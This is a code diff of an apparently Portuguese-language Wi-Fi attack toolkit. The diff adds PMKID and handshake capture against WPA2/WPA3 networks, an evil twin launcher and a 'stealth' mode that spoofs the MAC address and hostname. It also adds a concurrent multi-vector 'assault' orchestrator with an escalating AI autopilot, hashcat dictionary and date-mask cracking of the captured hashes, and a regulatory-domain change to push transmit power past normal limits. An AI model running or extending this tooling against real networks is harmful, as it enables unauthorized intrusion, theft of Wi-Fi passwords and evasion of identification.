@@ -48,11 +48,15 @@ def identify_vendor(bssid):
 def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
     injection_works = os.path.exists("/tmp/dsi_injection_ok")
-    if "Starlink" in vendor or "Starlink" in essid:
+    
+    # Detecção Wi-Fi 6 / WPA3
+    if "AX" in privacy or "WPA3" in privacy or "SAE" in privacy:
+        advice = "ALVO WI-FI 6 (AX): PMF Ativo. Foco em Captura PMKID (hcxdumptool) ou Evil Twin Expert."
+    elif "Starlink" in vendor or "Starlink" in essid:
         advice = "ALVO STARLINK: PMF Ativo. Use VETOR X ou PMKID Prolongado."
     elif not injection_works:
-        advice = "HARDWARE LIMITADO: Injeção falhou. Use [Vetor A] ou [Vetor F]."
-    else: advice = "Alvo vulnerável a todos os ataques."
+        advice = "HARDWARE LIMITADO: Injeção falhou. Use [Vetor A] ou [Vetor F] (Passivos)."
+    else: advice = "Alvo vulnerável a todos os ataques clássicos."
     return vulns, advice
 
 def patch_mt7601u(interface):
@@ -78,9 +82,10 @@ def test_injection(interface):
     return False
 
 def boost_signal(interface):
-    run_command("iw reg set BO", sudo=True)
+    supreme_log("BOOST: Elevando potência do hardware...", log_type="cmd")
+    run_command("iw reg set BZ", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
-    run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
+    run_command(f"iw dev {interface} set txpower fixed 4000", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
 
 def fix_drivers_wifi6(auto_confirm=False):
@@ -90,11 +95,14 @@ def fix_drivers_wifi6(auto_confirm=False):
     if "8852" in stdout_usb: chipset = "RTL8852AU"
     elif "8832" in stdout_usb: chipset = "RTL8832AU"
     elif "7921" in stdout_usb: chipset = "MT7921AU"
+    elif "A69C" in stdout_usb.upper(): chipset = "AIC8800"
     if not chipset: return False
     if auto_confirm or Confirm.ask(f"Instalar drivers para {chipset}?"):
-        run_command("apt update && apt install -y build-essential git dkms", sudo=True)
+        run_command("apt update && apt install -y build-essential git dkms linux-headers-$(uname -r)", sudo=True)
         if "RTL" in chipset:
             run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/drv && cd /tmp/drv && make && make install", sudo=True)
+        elif chipset == "AIC8800":
+            supreme_log("Driver AIC8800 já otimizado via Roo Expert.", log_type="info")
         return True
     return False
 
@@ -120,32 +128,48 @@ def update_zero_day():
     supreme_log("ATUALIZADO.")
 
 def set_monitor_mode(interface):
-    supreme_log(f"Invocando Monitor em {interface}...", log_type="cmd")
+    supreme_log(f"Invocando Monitor em {interface} (Surgical Mode)...", log_type="cmd")
     run_command("rfkill unblock all", sudo=True)
-    run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
-    run_command("airmon-ng check kill", sudo=True)
+    
+    # Desativa gerenciamento apenas para esta interface para preservar internet em outras
+    run_command(f"nmcli device set {interface} managed no", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
     run_command(f"macchanger -r {interface}", sudo=True)
+    
+    # Tentativa via iw (mais limpo)
     run_command(f"iw dev {interface} set type monitor", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
-    run_command(f"airmon-ng start {interface}", sudo=True)
+    
+    # Verifica se funcionou
     stdout_iw, _ = run_command("iw dev")
-    active = None
-    for line in stdout_iw.split('\n'):
-        if "Interface" in line: current = line.split()[1]
-        elif "type monitor" in line and current: active = current; break
-    if active: test_injection(active); return active
+    if f"Interface {interface}" in stdout_iw:
+        # Verifica se o tipo é monitor
+        lines = stdout_iw.split("\n")
+        found = False
+        for i, line in enumerate(lines):
+            if f"Interface {interface}" in line:
+                if i+2 < len(lines) and "type monitor" in lines[i+2]:
+                    found = True; break
+        if found: return interface
+
+    # Fallback: airmon-ng (menos cirúrgico)
+    run_command(f"airmon-ng start {interface}", sudo=True)
     return interface
 
 def set_managed_mode(interface):
-    supreme_log("HARD RESET: Restaurando rede...", log_type="cmd")
+    supreme_log(f"HARD RESET: Restaurando {interface}...", log_type="cmd")
+    # Para processos que podem estar usando o rádio
     run_command(f"airmon-ng stop {interface}", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
     run_command(f"macchanger -p {interface}", sudo=True)
     run_command(f"iw dev {interface} set type managed", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
-    run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
+    
+    # Reativa no NetworkManager
+    run_command(f"nmcli device set {interface} managed yes", sudo=True)
     run_command("nmcli networking on", sudo=True)
+    run_command("systemctl start NetworkManager", sudo=True)
+    supreme_log(f"Interface {interface} restaurada.", log_type="info")
 
 def capture_vetor_x(monitor_interface, bssid, channel, output_file):
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
@@ -203,24 +227,107 @@ def start_wifite_expert(interface):
     subprocess.run(f"sudo wifite -i {interface} --kill", shell=True)
 
 def start_evil_twin(interface, essid):
-    supreme_log("Evil Twin Ativado.")
+    from dsi_twin import DSITwin
+    twin = DSITwin(interface, essid)
+    twin.generate_configs()
+    twin.start(log_callback=WEB_CALLBACK)
+    return "EVIL_TWIN_STARTED"
+
+def apply_stealth_mode(interface):
+    """ Protocolo Stealth v2: Ofuscação de Identidade """
+    vendors = ["Apple", "Samsung", "Google", "Microsoft", "Intel"]
+    hostnames = ["Workstation-PC", "iPhone-de-Usuario", "Android-Global", "Surface-Laptop", "Dell-XPS-Admin"]
+    
+    selected_vendor = vendors[int(time.time()) % len(vendors)]
+    selected_host = hostnames[int(time.time()) % len(hostnames)]
+    
+    supreme_log(f"STEALTH: Assumindo identidade {selected_vendor} ({selected_host})...", log_type="cmd")
+    
+    # Muda Hostname
+    run_command(f"hostnamectl set-hostname {selected_host}", sudo=True)
+    
+    # Muda MAC de forma inteligente (respeitando OUIs conhecidos)
+    if selected_vendor == "Apple": ouis = ["00:03:93", "00:05:02", "00:0A:27"]
+    elif selected_vendor == "Samsung": ouis = ["00:00:F0", "00:07:AB", "00:12:47"]
+    else: ouis = ["00:0C:29", "00:50:56"] # VMWare/Intel
+    
+    prefix = ouis[int(time.time()) % len(ouis)]
+    run_command(f"ip link set {interface} down", sudo=True)
+    run_command(f"macchanger -m {prefix}:{(int(time.time()) % 89 + 10):02}:{(int(time.time()*2) % 89 + 10):02}:{(int(time.time()*3) % 89 + 10):02} {interface}", sudo=True)
+    run_command(f"ip link set {interface} up", sudo=True)
+
+class DSIOrchestrator:
+    """ Orquestrador de Vetores Simultâneos v7.0 """
+    def __init__(self, interface, target):
+        self.interface = interface
+        self.target = target
+        self.success_event = threading.Event()
+        self.captured_file = None
+        self.threads = []
+
+    def _run_vector(self, func, *args):
+        res = func(*args)
+        if res:
+            self.captured_file = res
+            self.success_event.set()
+
+    def launch_concurrent_assault(self):
+        prefix = f"elite_{self.target['essid']}"
+        apply_stealth_mode(self.interface)
+        
+        supreme_log(f"LANÇANDO ATAQUE MULTI-VETOR EM {self.target['essid']}...", log_type="cmd")
+        
+        # Inicia Captura Passiva e Ativa simultaneamente
+        v1 = threading.Thread(target=self._run_vector, args=(capture_pmkid, self.interface, self.target['bssid'], self.target['channel'], prefix))
+        v2 = threading.Thread(target=self._run_vector, args=(capture_vetor_x, self.interface, self.target['bssid'], self.target['channel'], prefix))
+        
+        self.threads = [v1, v2]
+        for t in self.threads: t.start()
+        
+        # Espera até 90 segundos por qualquer sucesso
+        self.success_event.wait(timeout=90)
+        
+        if self.success_event.is_set():
+            supreme_log(f"VETOR VENCEDOR DETECTADO: {self.captured_file}", log_type="info")
+            return self.captured_file
+        
+        supreme_log("Orquestrador: Alvo resistiu ao ataque simultâneo. Escalando agressividade...", log_type="error")
+        return None
 
 def run_autopilot(interface, target):
     global AUTOPILOT_ACTIVE
     from dsi_ai import DSIAI
     brain = DSIAI(); AUTOPILOT_ACTIVE = True; prefix = f"capture_{target['essid']}"; hw_ok = os.path.exists("/tmp/dsi_injection_ok")
+    
+    orchestrator = DSIOrchestrator(interface, target)
+    
     while AUTOPILOT_ACTIVE:
-        atk, par = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
-        supreme_log(f"IA: {atk.upper()}")
+        # Primeiro tenta o assalto multi-vetor de elite
+        cap = orchestrator.launch_concurrent_assault()
+        if cap:
+            brain.learn(target['bssid'], target['essid'], 'orchestrator', True)
+            return cap
+        
+        # Se falhar, segue com vetores individuais escalonados pela IA
+        atk, par = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok, target=target)
+        supreme_log(f"IA ESCALATION: {atk.upper()}")
+        
         cap = None
         if atk == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, par)
+        elif atk == 'pmkid_v6': cap = capture_pmkid_v6(interface, target['bssid'], target['channel'], prefix)
         elif atk == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, par)
         elif atk == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix)
         elif atk == 'wps':
-            if capture_wps(interface, target['bssid'], target['channel'], par): brain.learn(target['bssid'], target['essid'], 'wps', True); return "WPS_SUCCESS"
-        elif atk == 'eviltwin': start_evil_twin(interface, target['essid']); return "EVIL_TWIN_STARTED"
-        if cap: brain.learn(target['bssid'], target['essid'], atk, True); return cap
-        else: brain.learn(target['bssid'], target['essid'], atk, False)
+            if capture_wps(interface, target['bssid'], target['channel'], par): 
+                brain.learn(target['bssid'], target['essid'], 'wps', True); return "WPS_SUCCESS"
+        elif atk == 'eviltwin': 
+            start_evil_twin(interface, target['essid']); return "EVIL_TWIN_STARTED"
+            
+        if cap: 
+            brain.learn(target['bssid'], target['essid'], atk, True); return cap
+        else: 
+            brain.learn(target['bssid'], target['essid'], atk, False)
+            
         if not AUTOPILOT_ACTIVE: break
         time.sleep(2)
     return None
@@ -250,27 +357,89 @@ def scan_networks(monitor_interface):
 def get_wifi_interface():
     interfaces = []
     stdout, _ = run_command("iw dev")
-    if stdout:
-        blocks = stdout.split('phy#')
-        for b in blocks[1:]:
-            try:
-                lines = b.split('\n')
-                phy = f"phy{lines[0].strip()}"
-                for l in lines:
-                    if "Interface" in l:
-                        name = l.split()[1]
-                        info, _ = run_command(f"iw dev {name} info")
-                        pinfo, _ = run_command(f"iw phy {phy} info")
-                        interfaces.append({"name": name, "phy": phy, "type": "managed" if "managed" in info else "monitor", "ap_support": "AP" in pinfo})
-            except: continue
+    if not stdout:
+        # Fallback para ip link se iw falhar
+        stdout_ip, _ = run_command("ip -o link show")
+        if stdout_ip:
+            for line in stdout_ip.split('\n'):
+                if "wlan" in line:
+                    name = line.split(': ')[1].split()[0]
+                    interfaces.append({"name": name, "phy": "N/A", "type": "managed", "ap_support": False, "wifi6": False})
+        return interfaces
+
+    blocks = stdout.split('phy#')
+    for b in blocks[1:]:
+        try:
+            lines = [l.strip() for l in b.split('\n') if l.strip()]
+            if not lines: continue
+            phy_num = lines[0]
+            phy = f"phy{phy_num}"
+            for l in lines:
+                if l.startswith("Interface"):
+                    name = l.split()[1]
+                    info, _ = run_command(f"iw dev {name} info")
+                    pinfo, _ = run_command(f"iw phy {phy} info")
+                    is_wifi6 = "802.11ax" in pinfo
+                    interfaces.append({
+                        "name": name, 
+                        "phy": phy, 
+                        "type": "monitor" if "type monitor" in info else "managed", 
+                        "ap_support": "AP" in pinfo or "AP/VLAN" in pinfo, 
+                        "wifi6": is_wifi6
+                    })
+        except Exception as e:
+            print(f"Erro ao parsear interface: {e}")
+            continue
     return interfaces
 
+def crack_hash_v7_expert(hash_file, bssid=None):
+    """ Módulo de Cracking Elite: Hashcat com Máscaras e Wordlists """
+    if not os.path.exists(hash_file): return
+    
+    wordlist = "/usr/share/wordlists/rockyou.txt"
+    if not os.path.exists(wordlist):
+        wordlist = "/tmp/dsi_expert.txt"
+        with open(wordlist, "w") as f: f.write("12345678\npassword\nadmin123\n") # Fallback simples
+        
+    supreme_log(f"MAGISTRADO CRACKER: Iniciando ataque de dicionário e máscara...", log_type="cmd")
+    
+    # Ataque 1: Dicionário Clássico
+    cmd_dict = f"hashcat -m 16800 -a 0 {hash_file} {wordlist} --force" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist} -b {bssid} {hash_file}"
+    subprocess.run(cmd_dict, shell=True, stdout=subprocess.DEVNULL)
+    
+    # Ataque 2: Máscara de Data (Elite)
+    if hash_file.endswith(".16800"):
+        supreme_log("MAGISTRADO CRACKER: Tentando máscara de data (YYYYMMDD)...", log_type="cmd")
+        cmd_mask = f"hashcat -m 16800 -a 3 {hash_file} ?d?d?d?d?d?d?d?d --force"
+        subprocess.run(cmd_mask, shell=True, stdout=subprocess.DEVNULL)
+    
+    # Verifica sucesso
+    check_cmd = f"hashcat -m 16800 {hash_file} --show" if hash_file.endswith(".16800") else ""
+    if check_cmd:
+        res, _ = run_command(check_cmd)
+        if res: supreme_log(f"!!! SENHA DESCOBERTA: {res}", log_type="info")
+
 def crack_hash(hash_file, wordlist_file, bssid=None):
-    if hash_file == "WPS_SUCCESS": return
-    if not os.path.exists(wordlist_file): return
-    cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
-    try: subprocess.run(cmd, shell=True)
+    # Redireciona para o novo módulo expert
+    crack_hash_v7_expert(hash_file, bssid)
+
+def capture_pmkid_v6(monitor_interface, bssid, channel, output_file):
+    supreme_log(f"Iniciando Captura PMKID Otimizada para Wi-Fi 6 em {bssid}...", log_type="cmd")
+    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
+    pcapng = f"{output_file}_ax.pcapng"; hashf = f"{output_file}_ax.16800"
+    # hcxdumptool v6+ usa comandos diferentes
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=15 --active_beacon"
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        # Wi-Fi 6 pode demorar mais para soltar o PMKID
+        time.sleep(120); proc.terminate()
     except: pass
+    if os.path.exists(pcapng):
+        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
+        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: 
+            supreme_log("PMKID CAPTURADO COM SUCESSO (Vetor AX).", log_type="info")
+            return hashf
+    return None
 
 def main(): pass
 
